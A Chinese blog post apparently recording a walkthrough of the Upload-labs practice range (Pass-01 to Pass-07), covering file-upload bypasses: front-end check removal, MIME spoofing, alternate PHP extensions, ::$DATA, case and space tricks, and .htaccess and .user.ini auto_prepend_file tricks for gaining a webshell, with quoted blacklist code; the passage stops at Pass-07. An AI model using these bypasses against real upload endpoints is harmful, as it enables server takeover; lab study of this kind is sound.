<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="文明其思想，野蛮其体魄。">
    <meta name="author" content="二十八华生">
    
    <title>
        
            Upload-labs靶场学习记录 |
        
        二十八华生的博客
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/bitbug_favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"c2yb8er.cn","root":"/","language":"zh-CN","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/WanYe.jpg","favicon":"/images/bitbug_favicon.ico","avatar":"/images/WanYe.jpg","font_size":"15.2px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"文明其思想，||野蛮其体魄。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":true,"custom_label_list":[]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/WanYe.jpg">
                </a>
            
            <a class="logo-title" href="/">
               二十八华生的博客
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">Upload-labs靶场学习记录</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/WanYe.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">二十八华生</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-07-12 08:47:15</span>
        <span class="mobile">2023-07-12 08:47</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-10-18 19:33:25</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Web/">Web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Upload-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Upload-labs靶场学习记录</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>8.2k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>34 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <blockquote>
<p>RCE！</p>
</blockquote>
<span id="more"></span>



<blockquote>
<p>云链接有点问题，需要科学上网才能快速访问图片，由于图片过多，懒得修改了😥</p>
<p>已解决。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img lazyload alt="image" data-src="https://jsd.cdn.zzko.cn/gh/C2yb8er/picx-images-hosting@master/20230716/c2yb8erUpload-labs%E6%80%BB%E7%BB%93.3cojkvvb3860.png"></p>
<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><blockquote>
<p>考点：前端校验，后端无过滤</p>
</blockquote>
<h2 id="方法一：禁用前端JS函数"><a href="#方法一：禁用前端JS函数" class="headerlink" title="方法一：禁用前端JS函数"></a>方法一：禁用前端JS函数</h2><p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712163946361.76rp23ynn140.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712164705002.2ck87tdgx2sk.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712164749360.31z5lw2pmz00.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712164835007.4twnitp1ov40.png"></p>
<h2 id="方法二：伪造图片Burp拦截修改"><a href="#方法二：伪造图片Burp拦截修改" class="headerlink" title="方法二：伪造图片Burp拦截修改"></a>方法二：伪造图片Burp拦截修改</h2><p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712165144839.2z3dhmx4e7k0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712165322724.496las894y00.png"></p>
<h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><blockquote>
<p>后端白名单验证MIME</p>
</blockquote>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712170305216.40tl503r5y60.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712170423173.2s0xz2spgq40.png"></p>
<h2 id="补充MIME知识"><a href="#补充MIME知识" class="headerlink" title="补充MIME知识"></a>补充MIME知识</h2><p>详情连接：<a class="link" target="_blank" rel="noopener" href="https://www.runoob.com/http/mime-types.html">点此跳转<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>MIME（Multipurpose Internet Mail Extensions）是一种在互联网上标识文件格式的方法，用于指示数据包的内容类型。它通过在数据包的头部添加特定的MIME类型来实现。</p>
<p>MIME类型由两个部分组成：主类型（main type）和子类型（sub type），它们之间使用斜杠（/）分隔。主类型表示数据包的一般类别，而子类型表示具体的细分类型。</p>
<p>对于数据包（如文件、文档或媒体文件），MIME类型用于指示文件的内容类型。常见的MIME类型包括：</p>
<ul>
<li>文本文件：text/plain</li>
<li>HTML文件：text/html</li>
<li>XML文件：application/xml</li>
<li>JSON文件：application/json</li>
<li>PDF文件：application/pdf</li>
<li>图像文件：<MARK>image/jpeg、image/png、image/gif等</MARK></li>
<li>音频文件：audio/mpeg、audio/wav等</li>
<li>视频文件：video/mp4、video/quicktime等</li>
</ul>
<p>通过指定适当的MIME类型，可以确保接收方正确地解释和处理传输的数据包。</p>
</blockquote>
<h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><blockquote>
<p>黑名单不够丰富，扩展名替换绕过。</p>
</blockquote>
<h2 id="做题中得到的信息"><a href="#做题中得到的信息" class="headerlink" title="做题中得到的信息"></a>做题中得到的信息</h2><ol>
<li>上传shell.php文件后出现不允许上传.asp,.aspx,.php,.jsp后缀文件的信息。      </li>
<li>上传一个图片成功后，相应的URL为      <code>http://localhost/UP/upload/202307121834038403.png</code>，说明对文件名进行了基于时间重命名。</li>
<li>尝试了一下我知识库中的上传大写绕过，不通。</li>
</ol>
<h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">    <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol>
<li><code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code>: 这行代码定义了一个包含不允许的文件扩展名的数组。如果上传的文件扩展名与该数组中的任何项匹配，将会被拒绝上传。</li>
<li><code>$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</code>: 这行代码获取上传文件的原始文件名，并使用<code>trim()</code>函数去除首尾空格。</li>
<li><code>$file_name = deldot($file_name);</code>: 这行代码调用了一个名为<code>deldot()</code>的函数，用于删除文件名末尾的点（<code>.</code>）。</li>
<li><code>$file_ext = strrchr($file_name, &#39;.&#39;);</code>: 这行代码使用<code>strrchr()</code>函数获取文件名中最后一个点（<code>.</code>）后的部分，即文件扩展名。</li>
<li><code>$file_ext = strtolower($file_ext);</code>: 这行代码将文件扩展名转换为小写字母。<mark>这里就使我知识库中的大写绕过失效了。</mark></li>
<li><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>: 这行代码使用<code>str_ireplace()</code>函数将文件扩展名中的字符串 <code>::$DATA</code> 替换为空字符串。</li>
<li><code>$file_ext = trim($file_ext);</code>: 这行代码使用<code>trim()</code>函数去除文件扩展名首尾的空格。</li>
<li><code>if(!in_array($file_ext, $deny_ext)) &#123;</code>: 这行代码检查文件扩展名是否在不允许的扩展名数组中。如果文件扩展名不在数组中，表示允许上传该文件。</li>
<li><code>$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</code>: 这行代码获取上传文件的临时文件路径。</li>
<li><code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>: 这行代码构建了一个唯一的文件路径，其中包含了上传路径、日期时间、随机数和文件扩展名。这个路径将用于保存上传文件。</li>
</ol>
</blockquote>
<h2 id="方法一：使用同等扩展名进行绕过"><a href="#方法一：使用同等扩展名进行绕过" class="headerlink" title="方法一：使用同等扩展名进行绕过"></a>方法一：使用同等扩展名进行绕过</h2><blockquote>
<p>用.phtml .phps .php5 .pht进行绕过。这里我们直接上传一个.php5文件 为什么可以用这些代替.php的后缀？</p>
<p>这些后缀（.phtml, .phps, .php5, .pht）可以被用作替代 .php 文件的后缀，<strong>因为某些服务器配置或应用程序可能会将这些后缀与 PHP 解析器关联起来，以将其视为 PHP 脚本文件。</strong></p>
<p>在默认的服务器配置中，通常将 .php 后缀与 PHP 解析器相关联，这意味着只有文件扩展名为 .php 的文件会被解释为 PHP 脚本。但是，有些服务器可能会配置其他文件扩展名与 PHP 解析器相关联，以允许使用这些扩展名的文件作为 PHP 脚本运行。</p>
<p>这种配置的存在可能是因为历史原因、特定应用程序需求或安全漏洞导致的。某些配置可能允许用户上传使用这些特定扩展名的文件，并将它们当作 PHP 脚本执行。</p>
<p>然而，值得注意的是，许多服务器和应用程序已经对这些安全漏洞进行了修复，并禁止了使用这些特殊扩展名的文件作为 PHP 脚本运行。因此，为了确保安全，建议在服务器上禁止或限制不必要的文件扩展名与 PHP 解析器的关联，并采取其他安全措施来防止恶意代码执行。</p>
</blockquote>
<h2 id="File-Upload-General-Methodology"><a href="#File-Upload-General-Methodology" class="headerlink" title="File Upload General Methodology"></a>File Upload General Methodology</h2><ul>
<li><p><code>PHP  :  .php ,  .php2 ,  .php3 , . php4 , . php5 , . php6 , . php7 , .phps, . phps , . pht , . phtm, .phtml , . pgif ,  .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module </code></p>
<p>  <code>Working in PHPv8  :  .php ,  .php4 ,  .php5 ,  .phtml ,  .module ,  .inc ,  .hphp ,  .ctp </code></p>
</li>
<li><p><code>ASP  :  .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml </code></p>
</li>
<li><p><code>Jsp:    .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action </code></p>
</li>
<li><p><code>Coldfusion:    .cfm, .cfml, .cfc, .dbm </code></p>
</li>
<li><p><code>Flash  :  .swf </code></p>
</li>
<li><p><code>Perl  :  .pl, .cgi </code></p>
</li>
<li><p><code>Erlang Yaws Web Server  :  .yaws </code></p>
<p>  <strong>由于靶场搭建在本地，转换有点问题，故不进行演示，但是原理是可通的。</strong></p>
</li>
</ul>
<h2 id="方法二-上传图片马"><a href="#方法二-上传图片马" class="headerlink" title="方法二:上传图片马"></a>方法二:上传图片马</h2><blockquote>
<p>这个方法有点鸡肋，只是一种思路，因为即使你上传成功图片马了不一定又文件包含漏洞给你读取从而getshell。</p>
</blockquote>
<h2 id="方法三：-DATA-嵌套绕过"><a href="#方法三：-DATA-嵌套绕过" class="headerlink" title="方法三：::$DATA 嵌套绕过"></a>方法三：<code>::$DATA</code> 嵌套绕过</h2><p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713101143520.3r7s4yu2qiy0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713101301224.187zdir7z9ls.png"></p>
<h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><blockquote>
<p>.htaccess 绕过</p>
</blockquote>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712191656160.6y4ufe6h0rs0.png"></p>
<h2 id="相关知识补充"><a href="#相关知识补充" class="headerlink" title="相关知识补充"></a>相关知识补充</h2><blockquote>
<p><code>.htaccess（Hypertext Access）</code>是一个<strong>用于在 Apache Web 服务器上配置目录级别的设置和控制的配置文件。</strong>它使用一个名为 “.htaccess” 的文件来存储这些配置指令。这个文件通常位于要配置的目录中，它可以包含一系列的指令，用于修改服务器的行为、启用/禁用功能、重写URL等。</p>
<p><code>.htaccess </code>文件可以用于实现各种功能，包括：</p>
<ol>
<li>URL 重写：通过使用 RewriteRule 指令，可以将复杂的 URL 重写为更友好、易读的格式。</li>
<li>访问控制：可以限制特定 IP 地址或 IP 地址范围的访问，设置基本的身份验证，或禁止特定的文件或目录的访问。</li>
<li>错误页面定制：可以定义自定义的错误页面，如 404 Not Found、500 Internal Server Error 等。</li>
<li>缓存控制：可以指定缓存的过期时间、缓存策略等。</li>
<li>重定向：可以设置页面或目录的重定向，将请求导向其他页面或站点。</li>
</ol>
<p><code>.htaccess </code>绕过是指尝试绕过或利用服务器上的<code>.htaccess</code>文件的安全配置来实现某些目的，通常是为了执行恶意操作或绕过访问控制。攻击者可能会通过上传或修改<code>.htaccess</code>文件来修改服务器配置、访问受限文件、执行未经授权的操作等。这种绕过通常涉及发现和利用服务器配置中的漏洞或弱点。</p>
<p>为了防止<code>.htaccess</code>绕过，建议采取以下措施：</p>
<ol>
<li>限制对 <code>.htaccess </code>文件的访问权限，确保只有授权用户可以修改它。</li>
<li>审查<code>.htaccess</code>文件中的配置，确保其中没有任何恶意或危险的指令。</li>
<li>定期更新和维护服务器软件和配置，以确保修复已知的漏洞和安全问题。</li>
<li>配置合适的访问控制和权限管理，限制对敏感文件和目录的访问。</li>
<li>监控服务器日志和活动，及时发现异常行为和潜在的绕过尝试。</li>
</ol>
</blockquote>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230712192524623.5s7oqw7v5nc0.png"></p>
<pre><code>先上传`.htaccess`文件后上传文件🐎即可getshell    
</code></pre>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713131210973.1t4cgk5w9vpc.png"></p>
<p><strong>    由于靶场搭建在本地，转换有点问题，故不进行演示，但是原理是可通的。</strong>    </p>
<h2 id="尝试用-DATA嵌套绕过但绕不过"><a href="#尝试用-DATA嵌套绕过但绕不过" class="headerlink" title="尝试用::$DATA嵌套绕过但绕不过"></a>尝试用<code>::$DATA</code>嵌套绕过但绕不过</h2><p>能使用<code>::$DATA</code>的情况是:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;      </span><br></pre></td></tr></table></figure>

<p>本题是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure>

<p>如果我们直接传入<code>shell.php::$DA::$DATATA</code></p>
<p>第二种情况和第一种情况分别如下：</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8er%7DM_GJZPRRYL%7BIKG%7DCNJP93L.4mv7gcxswsu0.png"></p>
<p>问题就出来这里文件名被解析成<code>shell.php::$DA::$DATATA</code>不合法，移动不成功。</p>
<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><blockquote>
<p>user.ini 绕过</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> =</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,</span><br><span class="line"><span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtm</span></span><br><span class="line"><span class="string">l&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string">aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>.user.ini</code> 是一个用于在 PHP 环境中配置用户级别设置的文件。与 .htaccess 文件类似， <code>.user.ini </code>文件</p>
<p>也存储了一系列的指令，用于修改 PHP 的配置参数。<code>.user.ini </code>文件通常位于用户的网站根目录中，或者它</p>
<p>可以放置在特定目录中以仅影响该目录及其子目录的 PHP 配置。</p>
<p>通过 <code>.user.ini </code>文件，用户可以自定义一些 PHP 的配置参数，例如：</p>
<ol>
<li>修改 PHP 的内存限制（memory_limit）</li>
<li>设置 PHP 的执行时间限制（max_execution_time）</li>
<li>启用或禁用特定的 PHP 扩展模块（extension）</li>
<li>配置 PHP 的错误报告级别（error_reporting）</li>
<li>修改上传文件的最大大小（upload_max_filesize）</li>
<li>等等</li>
</ol>
<p><code>.user.ini </code>绕过是指试图绕过或利用<code>.user.ini</code>文件的安全配置来执行一些非授权操作。攻击者可能会通过</p>
<p>修改<code>.user.ini</code>文件，更改 PHP 配置参数来实现他们的目的，例如增加内存限制以执行恶意代码、修改上传</p>
<p>文件大小以绕过限制等。</p>
<p>为了防止 <code>.user.ini </code>绕过，建议采取以下措施：</p>
<ol>
<li>限制对 <code>.user.ini </code>文件的访问权限，确保只有授权用户可以修改它。</li>
<li>审查<code>.user.ini</code>文件中的配置，确保其中没有任何恶意或危险的指令。</li>
<li>定期更新和维护 PHP 环境，以确保修复已知的漏洞和安全问题。</li>
<li>配置合适的访问控制和权限管理，限制对 <code>.user.ini </code>文件的访问和修改。</li>
<li>监控服务器日志和活动，及时发现异常行为和潜在的绕过尝试。</li>
</ol>
</blockquote>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212239570.24svw3aorw68.png"></p>
<blockquote>
<p>在<code>.user.ini</code>文件中设置 <code>auto_prepend_file=shell.jpg</code> 表示将 shell.png 文件作为 PHP 脚本</p>
<p>的自动预置文件。当 PHP 解析器处理每个请求时，它会自动在开始执行任何 PHP 脚本之前加载并执行</p>
<p>指定的 <code>shell.png </code>文件。</p>
<p>这样的设置可以用于在每个 PHP 脚本执行之前自动执行特定的代码或加载某些函数、类、配置等。</p>
<p><code>shell.png </code>文件可以包含任意有效的 PHP 代码，因此在这个文件中可以执行各种操作，包括与服务</p>
<p>器交互、访问数据库、修改文件等。</p>
</blockquote>
<p>先上传<code>.user.ini</code>文件后上传文件🐎即 <code>shell.png</code> 即可getshell，这里的readme.php是该目录是上传文件保存，该文件为系统说明文件。</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212322969.3d1u45acyqq0.png"></p>
<h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><blockquote>
<p>大小写绕过，Windows特性</p>
</blockquote>
<p>程序少了这一行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713212359598.51tszi14skw0.png"></p>
<h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><blockquote>
<p>空格绕过，Windows特性</p>
</blockquote>
<p>程序少了这两行代码：</p>
